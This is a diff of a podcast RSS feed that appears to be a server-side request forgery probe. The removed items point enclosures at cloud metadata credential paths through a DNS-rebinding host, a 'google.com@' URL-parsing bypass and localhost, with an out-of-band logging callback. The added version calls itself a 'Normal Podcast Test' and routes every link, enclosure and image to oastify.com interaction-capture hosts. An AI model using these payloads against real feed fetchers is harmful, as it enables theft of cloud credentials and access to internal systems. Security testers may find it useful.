@@ -1,19 +1,13 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Infrastructure Integrity Check vFinal</title>
+    <title>Normal Podcast Test</title>
+    <link>https://v512dezee9bdq86rpbb9ht6gp7vyjr7g.oastify.com/main</link>
+    <description>Just a normal podcast</description>
     <item>
-      <title>Vector 1: DNS Rebinding</title>
-      <enclosure url="http://08080808.a9fea9fe.rbndr.us:80/latest/meta-data/iam/security-credentials/" length="1" type="audio/mpeg"/>
-    </item>
-    <item>
-      <title>Vector 2: Schema Bypass</title>
-      <enclosure url="http://google.com@08080808.a9fea9fe.rbndr.us/latest/meta-data/" length="1" type="audio/mpeg"/>
-    </item>
-    <item>
-      <title>Vector 3: Localhost Map</title>
-      <enclosure url="http://localhost:80/latest/meta-data/" length="1" type="audio/mpeg"/>
-      <itunes:image href="http://tdcmnpibaxfcyugdfqmw1df4f7asazr7x.oast.fun/final_attempt_log"/>
+      <title>Episode 1</title>
+      <enclosure url="hl6mxsqxq1ru0e0m6991fn7c43auypme.oastify.com/audio.mp3" length="1024" type="audio/mpeg"/>
+      <itunes:image href="https://v512dezee9bdq86rpbb9ht6gp7vyjr7g.oastify.com/image.jpg"/>
     </item>
   </channel>
 </rss>
